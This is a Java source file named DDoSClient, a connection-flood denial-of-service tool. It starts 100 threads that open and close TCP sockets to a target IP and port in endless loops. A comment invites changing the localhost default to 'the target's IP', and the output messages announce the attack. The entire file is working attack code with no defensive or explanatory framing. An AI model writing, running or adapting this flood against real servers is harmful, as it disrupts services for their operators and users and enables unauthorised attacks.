import java.io.IOException;
import java.net.Socket;

public class DDoSClient {
    public static void main(String[] args) {
        String targetIP = "127.0.0.1"; // Change this to the target's IP
        int port = 5050; // The port the server is listening on
        int threadCount = 100; // Number of threads to simulate concurrent connections

        System.out.println("⚠️ Starting attack with " + threadCount + " threads...");

        // Creating and starting threads
        for (int i = 0; i < threadCount; i++) {
            Thread attackThread = new Thread(() -> {
                while (true) {
                    try {
                        // Attempt to establish a connection to the server
                        Socket socket = new Socket(targetIP, port);
                        System.out.println("🔁 Sending request to " + targetIP + ":" + port);
                        socket.close(); // Close socket immediately after sending the request
                    } catch (IOException e) {
                        System.out.println("❌ Connection failed: " + e.getMessage());
                    }
                }
            });

            attackThread.start(); // Start the thread
        }
    }
}
